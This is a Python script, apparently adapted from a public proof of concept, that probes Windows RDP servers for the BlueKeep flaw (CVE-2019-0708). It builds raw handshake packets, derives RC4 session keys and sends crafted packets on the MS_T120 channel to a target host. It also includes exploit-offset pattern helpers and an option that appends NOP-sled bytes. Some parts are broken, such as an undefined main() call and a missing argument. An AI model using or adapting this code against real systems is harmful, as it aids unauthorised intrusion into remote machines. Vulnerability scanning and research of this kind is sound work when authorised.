import sys
import struct
import socket
import hashlib
from Crypto.Cipher import ARC4
import binascii
import time
import argparse
from random_username.generate import generate_username
import random
from string import ascii_uppercase, ascii_lowercase, digits
#I did not write this beauty just modified and classed it out for my use great work btw bro whoever u are
R = '\033[91m'  # red
W = '\033[0m'  # white

MAX_PATTERN_LENGTH = 20280

class MaxLengthException(Exception):
    pass

class WasNotFoundException(Exception):
    pass

class MST_120_Custom_channel:
    
  def __init__(self, host, port ,username):
    self.host = host
    self.port = port
    self.is_safe = True
    self.username = username
    self.server_rsa_modulus = ""
    self.rsa_magic = ""
    self.rsa_bitlen = ""
    self.modulus_old = ""
    self.rsa_modulus_new = ""
    self.rsa_SERVER_EXPONENT = ""
    self.SERVER_RANDOM = ""
    self.PreMasterSecret = ""
    self.MasterSecret = ""
    self.sessionKeyBlob = ""
    self.macKey = ""
    self.initialClientDecryptKey128 = ""
    self.initialClientEncryptKey128 = ""
    self.RC4_ENC_KEY = ""
    self.RC4_DEC_KEY = ""
    self.HMAC_KEY = ""
    self.SESS_BLOB = ""
    self.client_rand = "\x41" * 32

  #bluekeep pattern assitance? would that even work here fuck if i know
  def pattern_gen(self,length):
      """
      #https://github.com/Svenito/exploit-pattern/blob/master/pattern.py
      Generate a pattern of a given length up to a maximum
      of 20280 - after this the pattern would repeat
      """
      if length >= MAX_PATTERN_LENGTH:
         raise MaxLengthException('ERROR: Pattern length exceeds maximum of %d' % MAX_PATTERN_LENGTH)

      pattern = ''
      for upper in ascii_uppercase:
          for lower in ascii_lowercase:
              for digit in digits:
                  if len(pattern) < length:
                      pattern += upper+lower+digit
                  else:
                      out = pattern[:length]
                      return out


  def pattern_search(self,search_pattern):
      """
      Search for search_pattern in pattern.  Convert from hex if needed
      Looking for needle in haystack
      """
      needle = search_pattern

      try:
          if needle.startswith('0x'):
              # Strip off '0x', convert to ASCII and reverse
              needle = needle[2:]
              needle = bytearray.fromhex(needle).decode('ascii')
              needle = needle[::-1]
      except (ValueError, TypeError) as e:
          raise
    

      haystack = ''
      for upper in ascii_uppercase:
          for lower in ascii_lowercase:
              for digit in digits:
                  haystack += upper+lower+digit
                  found_at = haystack.find(needle)
                  if found_at > -1:
                      return found_at

      raise WasNotFoundException('Couldn`t find %s (%s) anywhere in the pattern.' %
            (search_pattern, needle))

    

  def parser_error(self,errmsg):
      print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
      print(R + "Error: " + errmsg + W)
      sys.exit()


  def parse_args(self):
      parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " [options]")
      parser.error = parser_error
      parser._optionals.title = "OPTIONS"
      parser.add_argument('--host', help="target ip to scan for CVE-2019-0708 - BlueKeep")
 
      return parser.parse_args()

  def error_msg(self,msg):
      print(R + "Error: " + msg + W)
      sys.exit()


  def hexdump(self,src, length=16):
      FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
      lines = []
      for c in xrange(0, len(src), length):
          chars = src[c:c+length]
          hex = ' '.join(["%02x" % ord(x) for x in chars])
          printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
          lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
      return ''.join(lines)




  def check_rdp_vuln(self,username):
      x_224_conn_req = "\x03\x00\x00" + "{0}"                       # TPKT Header
      x_224_conn_req+=  chr(33+len(username))      # X.224: Length indicator
      x_224_conn_req+= "\xe0"                                  # X.224: Type - TPDU
      x_224_conn_req+= "\x00\x00"                              # X.224: Destination reference
      x_224_conn_req+= "\x00\x00"                              # X.224: Source reference
      x_224_conn_req+= "\x00"                                  # X.224: Class and options
      x_224_conn_req+= "\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d" # "Cookie: mstshash=
      x_224_conn_req+=  username                         # coookie value 
      x_224_conn_req+= "\x0d\x0a"                              # Cookie terminator sequence
      x_224_conn_req+= "\x01"                                  # Type: RDP_NEG_REQ)
      x_224_conn_req+=  "\x00"                                 # RDP_NEG_REQ::flags 
      x_224_conn_req+=  "\x08\x00"                             # RDP_NEG_REQ::length (8 bytes)
      x_224_conn_req+=  "\x00\x00\x00\x00"                     # Requested protocols (PROTOCOL_RDP)

      return x_224_conn_req

  def pdu_connect_initial(self,hostname):
      host_name = ""
      for i in hostname:
          host_name+=struct.pack("<h",ord(i))
      host_name+= "\x00"*(32-len(host_name))

      mcs_gcc_request = ("\x03\x00\x01\xca" # TPKT Header
      "\x02\xf0\x80"             # x.224
      "\x7f\x65\x82\x01\xbe" # change here
      "\x04\x01\x01\x04"
      "\x01\x01\x01\x01\xff"
      "\x30\x20\x02\x02\x00\x22\x02\x02\x00\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x30\x20"
      "\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x04\x20\x02\x02\x00\x02\x30\x20\x02\x02"
      "\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01\x4b" # chnage here
      "\x00\x05\x00\x14\x7c\x00\x01\x81\x42" # change here - ConnectPDU
      "\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34" # chnage here 
      "\x01\xc0\xd8\x00\x04\x00\x08\x00\x20\x03\x58\x02\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00")


      mcs_gcc_request+= host_name # Client name -32 Bytes - we45-lt35
    
      mcs_gcc_request+=(
      "\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x09\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x03\x00\x00\x00\x00\x00\x00\x00"
      "\x03\xc0"
      "\x44\x00"
      "\x04\x00\x00\x00" #channel count
      "\x63\x6c\x69\x70\x72\x64\x72\x00\xc0\xa0\x00\x00" #cliprdr
      "\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00" #MS_T120 
      "\x72\x64\x70\x73\x6e\x64\x00\x00\xc0\x00\x00\x00" #rdpsnd
      "\x73\x6e\x64\x64\x62\x67\x00\x00\xc0\x00\x00\x00" #snddbg
      "\x72\x64\x70\x64\x72\x00\x00\x00\x80\x80\x00\x00" #rdpdr
      )

      return mcs_gcc_request


  def hex_str_conv(self,hex_str):
      hex_res = ""

      for i in bytearray(hex_str):
          hex_res+="\\x"
          hex_res+="%02x"%i

      return hex_res

  def bin_to_hex(self,s):
      return s.encode("hex")

  def bytes_to_bignum(self,bytesIn, order = "little"):
      
      if order == "little":
          bytesIn = bytesIn[::-1]

      bytes = self.bin_to_hex(bytesIn)
      s = "0x"+bytes
      return int(s,16)

  def int_to_bytestring(self,daInt):
      hex_pkt = "%x"%daInt
      return binascii.unhexlify(hex_pkt)[::-1]


  def rsa_encrypt(self,bignum, rsexp, rsmod):
      return (bignum ** rsexp) % rsmod

  def rdp_rc4_crypt(self,rc4obj, data):
      return rc4obj.encrypt(data)


  def rdp_parse_serverdata(self,pkt):
      ptr = 0
      rdp_pkt = pkt[0x49:]

      while ptr < len(rdp_pkt):
          header_type = rdp_pkt[ptr:ptr+2]
          header_length = struct.unpack("<h",rdp_pkt[ptr+2:ptr+4])[0]

          print("- Header: {}  Len: {}".format(self.bin_to_hex(header_type),header_length))

          if header_type == "\x02\x0c":
              print("- Security Header")
              # print("Header Length: {}".format(header_length))
              server_random = rdp_pkt[ptr+20:ptr+52]
              public_exponent = rdp_pkt[ptr+84:ptr+88]

            
              modulus = rdp_pkt[ptr+88:ptr+152]
              print("- modulus_old: {}".format(self.bin_to_hex(modulus)))
              rsa_magic = rdp_pkt[ptr+68:ptr+72]

              if rsa_magic != "RSA1":
                  print("Server cert isn't RSA, this scenario isn't supported (yet).")
                  # sys.exit(1)

              print("- RSA magic: {}".format(rsa_magic))
              bitlen = struct.unpack("<L",rdp_pkt[ptr+72:ptr+76])[0] - 8
              print("- RSA bitlen: {}".format(bitlen))
              modulus = rdp_pkt[ptr+88:ptr+87+1+bitlen]
              print("- modulus_new: {}".format(self.bin_to_hex(modulus)))
    
          ptr += header_length

      print("- SERVER_MODULUS: {}".format(self.bin_to_hex(modulus)))
      print("- SERVER_EXPONENT: {}".format(self.bin_to_hex(public_exponent)))
      print("- SERVER_RANDOM: {}".format(self.bin_to_hex(server_random)))

      rsmod = self.bytes_to_bignum(modulus)
      rsexp = self.bytes_to_bignum(public_exponent)
      rsran = self.bytes_to_bignum(server_random)
      
      self.server_rsa_modulus = rsmod
      self.rsa_magic = rsa_magic
      self.rsa_bitlen = bitlen
      self.rsa_SERVER_EXPONENT = rsexp
      self.SERVER_RANDOM = server_random
      
      return rsmod, rsexp, rsran, server_random, bitlen



  def pdu_channel_request(self,userid,channel):
      join_req = "\x03\x00\x00\x0c\x02\xf0\x80\x38"
      join_req+= struct.pack(">hh",userid,channel)
      return join_req


  def mcs_erect_domain_pdu(self):
      mcs_erect_domain_pdu = "\x03\x00\x00\x0c\x02\xf0\x80\x04\x00\x01\x00\x01"
      return mcs_erect_domain_pdu

  def msc_attach_user_pdu(self):
      msc_attach_user_pdu = "\x03\x00\x00\x08\x02\xf0\x80\x28"
      return msc_attach_user_pdu

  def pdu_security_exchange(self,rcran, rsexp, rsmod, bitlen):
      encrypted_rcran_bignum = self.rsa_encrypt(rcran, rsexp, rsmod)
      encrypted_rcran = self.int_to_bytestring(encrypted_rcran_bignum)

      bitlen += 8
      bitlen_hex = struct.pack("<L",bitlen)

      print("Encrypted client random: {}".format(self.bin_to_hex(encrypted_rcran)))

      userdata_length = 8 + bitlen
      userdata_length_low = userdata_length & 0xFF
      userdata_length_high = userdata_length / 256

      flags = 0x80 | userdata_length_high

      pkt = "\x03\x00"
      pkt+=struct.pack(">h",userdata_length+15) # TPKT
      pkt+="\x02\xf0\x80" # X.224
      pkt+="\x64" # sendDataRequest
      pkt+="\x00\x08" # intiator userId
      pkt+="\x03\xeb" # channelId = 1003
      pkt+="\x70" # dataPriority
      pkt+=struct.pack("h",flags)[0]
      pkt+=struct.pack("h",userdata_length_low)[0] # UserData length
      pkt+="\x01\x00" # securityHeader flags
      pkt+="\x00\x00" # securityHeader flagsHi
      pkt+= bitlen_hex # securityPkt length
      pkt+= encrypted_rcran # 64 bytes encrypted client random
      pkt+= "\x00\x00\x00\x00\x00\x00\x00\x00" # 8 bytes rear padding (always present)

      return pkt

  def rdp_salted_hash(self,s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes):
      hash_sha1 = hashlib.new("sha1")
      hash_sha1.update(i_bytes)
      hash_sha1.update(s_bytes)
      hash_sha1.update(clientRandom_bytes)
      hash_sha1.update(serverRandom_bytes)

      hash_md5=hashlib.md5()
      hash_md5.update(s_bytes)
      hash_md5.update(binascii.unhexlify(hash_sha1.hexdigest()))

      return binascii.unhexlify(hash_md5.hexdigest())
     

  def rdp_final_hash(self,k, clientRandom_bytes, serverRandom_bytes):
      md5 = hashlib.md5()

      md5.update(k)
      md5.update(clientRandom_bytes)
      md5.update(serverRandom_bytes)

      return binascii.unhexlify(md5.hexdigest())

  def rdp_hmac(self,mac_salt_key, data_content):
      sha1 = hashlib.sha1()
      md5 =  hashlib.md5()

      pad1 = "\x36" * 40
      pad2 = "\x5c" * 48

      sha1.update(mac_salt_key)
      sha1.update(pad1)
      sha1.update(struct.pack('<L',len(data_content)))
      sha1.update(data_content)

      md5.update(mac_salt_key)
      md5.update(pad2)
      md5.update(binascii.unhexlify(sha1.hexdigest()))

      return binascii.unhexlify(md5.hexdigest())



  def rdp_calculate_rc4_keys(self,client_random, server_random):

      self.preMasterSecret = client_random[0:24] + server_random[0:24]
      self.masterSecret = self.rdp_salted_hash(self.preMasterSecret,"A",client_random,server_random) +  self.rdp_salted_hash(self.preMasterSecret,"BB",client_random,server_random) + self.rdp_salted_hash(self.preMasterSecret,"CCC",client_random,server_random)
      sessionKeyBlob = self.rdp_salted_hash(self.masterSecret,"X",client_random,server_random) +  self.rdp_salted_hash(self.masterSecret,"YY",client_random,server_random) + self.rdp_salted_hash(self.masterSecret,"ZZZ",client_random,server_random)
      initialClientDecryptKey128 = self.rdp_final_hash(sessionKeyBlob[16:32], client_random, server_random)
      initialClientEncryptKey128 = self.rdp_final_hash(sessionKeyBlob[32:48], client_random, server_random)

      macKey = sessionKeyBlob[0:16]

      print("PreMasterSecret = {}".format(self.bin_to_hex(self.preMasterSecret)))
      print("MasterSecret = {}".format(self.bin_to_hex(self.masterSecret)))
      print("sessionKeyBlob = {}".format(self.bin_to_hex(sessionKeyBlob)))
      print("macKey = {}".format(self.bin_to_hex(macKey)))
      print("initialClientDecryptKey128 = {}".format(self.bin_to_hex(initialClientDecryptKey128)))
      print("initialClientEncryptKey128 = {}".format(self.bin_to_hex(initialClientEncryptKey128)))

      return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob


  def pdu_client_info(self,username):
      data = "000000003301000000000a000000000000000000"
      data+= binascii.hexlify(username) # FIXME: username
      data+="000000000000000002001c00"
      data+="3100390032002e003100360038002e0031002e00320030003800" # FIXME: ip
      data+="00003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000"

      return binascii.unhexlify(data)


  def pdu_client_confirm_active(self):
      data = "a4011300f103ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00100001000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000"
      return binascii.unhexlify(data)


  def pdu_client_persistent_key_list(self):
      data = "49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      return binascii.unhexlify(data)



  def rdp_encrypted_pkt(self,data, rc4enckey, hmackey, flags = "\x08\x00", flagsHi = "\x00\x00", channelId="\x03\xeb"):
      #apparently we have control only over the data portion of this connection while that may seem obv this is confusing shit
      #what I am getting at is if done properly illegal use of the MS_t120 channel illegal alpha name does nothing it will clean it up properly
      userData_len = len(data) + 12
      udl_with_flag = 0x8000 | userData_len
      pkt = "\x02\xf0\x80" # X.224
      pkt+= "\x64" # sendDataRequest
      pkt+= "\x00\x08" # intiator userId .. TODO: for a functional client this isn't static
      pkt+= channelId # channelId = 1003
      pkt+= "\x70" # dataPriority
      pkt+= binascii.unhexlify("%x"%udl_with_flag)
      pkt+= flags #{}"\x48\x00" # flags  SEC_INFO_PKT | SEC_ENCRYPT
      pkt+= flagsHi # flagsHi

      pkt+= self.rdp_hmac(hmackey, data)[0:8]
      pkt+= self.rdp_rc4_crypt(rc4enckey, data)

      tpkt = "\x03\x00"
      tpkt+=struct.pack(">h",len(pkt) + 4)
      tpkt+=pkt

      return tpkt

    

  def try_check_safe(self,s,rc4enckey, hmackey):
      safe_packet = ""    
      safe_packet += b"100000000300000000000000020000000000000000000000"
      if not  self.is_safe:
         safe_packet += b"909090909090909090909090909090909090909090909090909090909090"
      is_vuln = False
      print("[+] Sending Disconnect Provider Ultimatum PDU Packet")
      for i in range(0,6):
          flags = b"\x08\x00"
          flags_toking = b"\x00\x00"
          ChanId = b"\x03\xed"
          pkt = self.rdp_encrypted_pkt(binascii.unhexlify(safe_packet), rc4enckey, hmackey, flags , flags_toking, ChanId)
          s.sendall(pkt)
          pkt = self.rdp_encrypted_pkt(binascii.unhexlify("20000000030000000000000000000000020000000000000000000000000000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
          s.sendall(pkt)

          for i in range(0,4):
            res = s.recv(1024)
            if binascii.unhexlify("0300000902f0802180") in res:
              print("[+] Found MCS Disconnect Provider Ultimatum PDU Packet Server tells us to screw")
              print("[+] Vulnerable....Vulnerable.... Vulnerable")
              print("[+] HexDump: MCS Disconnect Provider Ultimatum PDU")
              print(self.hexdump(res))
              is_vuln += True
            
      return is_vuln      

        
  

  def MSt_120_Channel(self,host,port,hostname,username):
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((host,port))

      print("[+] Verifying RDP Portocol....")    
      x_224_conn_req = self.check_rdp_vuln(username)
      s.sendall(x_224_conn_req.format(chr(33+len(username)+5)))
      s.recv(8192)

      print("[+] PDU X.224 Response Received.")
      print("[+] Sending MCS Connect Initial PDU with GCC Conference.")
      s.sendall(self.pdu_connect_initial(hostname))
      res = s.recv(10000)


      print("[+] MCS Response PDU with GCC Conference Received.")
      print("[+] Parsing RSA Params.")
      rsmod, rsexp, rsran, server_rand, bitlen = self.rdp_parse_serverdata(res)


      print("[+] Sending MCS Erect Request.")
      s.sendall(self.mcs_erect_domain_pdu())

      print("[+] Sending MCS Attach User PDU Request.")
      s.sendall(self.msc_attach_user_pdu())

      res = s.recv(8192)
      mcs_packet = bytearray(res)
      user1= mcs_packet[9] + mcs_packet[10]

      print("[+] Send PDU  Request for 7 channel with AttachUserConfirm::initiator: {}".format(user1))
      s.sendall(self.pdu_channel_request(user1, 1009))
      s.recv(8192)
      s.sendall(self.pdu_channel_request(user1, 1003))
      s.recv(8192)
      s.sendall(self.pdu_channel_request(user1, 1004))
      s.recv(8192)
      s.sendall(self.pdu_channel_request(user1, 1005))
      s.recv(8192)
      s.sendall(self.pdu_channel_request(user1, 1006))
      s.recv(8192)
      s.sendall(self.pdu_channel_request(user1, 1007))
      s.recv(8192)
      s.sendall(self.pdu_channel_request(user1, 1008))
      s.recv(8192)

      
      rcran = self.bytes_to_bignum(self.client_rand)

      print("[+] Sending security exchange PDU")
      s.sendall(self.pdu_security_exchange(rcran, rsexp, rsmod, bitlen))

      rc4encstart, rc4decstart, hmackey, sessblob = self.rdp_calculate_rc4_keys(self.client_rand, self.SERVER_RANDOM)

      print("- RC4_ENC_KEY: {}".format(self.bin_to_hex(rc4encstart)))
      print("- RC4_DEC_KEY: {}".format(self.bin_to_hex(rc4decstart)))
      print("- HMAC_KEY: {}".format(self.bin_to_hex(hmackey)))
      print("- SESS_BLOB: {}".format(self.bin_to_hex(sessblob)))

      rc4enckey = ARC4.new(rc4encstart)

      print("[+] Sending encrypted client info PDU")
      s.sendall(self.rdp_encrypted_pkt(self.pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))
      res = s.recv(8192)

      print("[+] Received License packet: {}".format(self.bin_to_hex(res)))

      res = s.recv(8192)
      print("[+] Received Server Demand packet: {}".format(self.bin_to_hex(res)))

      print("[+] Sending client confirm active PDU")
      s.sendall(self.rdp_encrypted_pkt(self.pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))

      print("[+] Sending client synchronize PDU")
      print("[+] Sending client control cooperate PDU")
      synch = self.rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey, hmackey)
      coop = self.rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"), rc4enckey, hmackey)
      s.sendall(synch + coop)

      print("[+] Sending client control request control PDU")
      s.sendall(self.rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey, hmackey))

      print("[+] Sending client persistent key list PDU")
      s.sendall(self.rdp_encrypted_pkt(self.pdu_client_persistent_key_list(), rc4enckey, hmackey))

      print("[+] Sending client font list PDU")
      s.sendall(self.rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey, hmackey))
      
      
      return s,rc4enckey, hmackey
      

      



       
def violent_pianist(host,port):
    #poc not my code I just instrumented it diff to understand it or try not sure original author ;) sorry google if u care
    usernames = generate_username(10) # randomize user name here
    username  = random.choice(usernames) 
    hostname= "lol"
    sink_object = MST_120_Custom_channel(host,port,username)#new object with access to mst120 channel
    print("Detecting if exploit is present using username: "+str(username))
    channel_socket,rc4enckey,hmackey = sink_object.MSt_120_Channel(host,port,hostname,username)
    result = sink_object.try_check_safe(channel_socket,rc4enckey, hmackey)
    if result:
       print("successful hit on plugin rdp is vuln")

    else:
       print("Rdp Is Not Vulnerable")

    global_connection_dict = {"RSA_Modulus":sink_object.server_rsa_modulus,"RSA_Magic":sink_object.rsa_magic,"RSA_Server_Exponent":sink_object.rsa_SERVER_EXPONENT,
                              "RSA_Bitlen":sink_object.rsa_bitlen,"RSA_Server_Random":sink_object.SERVER_RANDOM,"Channel_Socket":channel_socket,
                              "Rc4_Enc_Key":rc4enckey,"Hmackey":hmackey}
    
    return(result,global_connection_dict)
    
    
main()
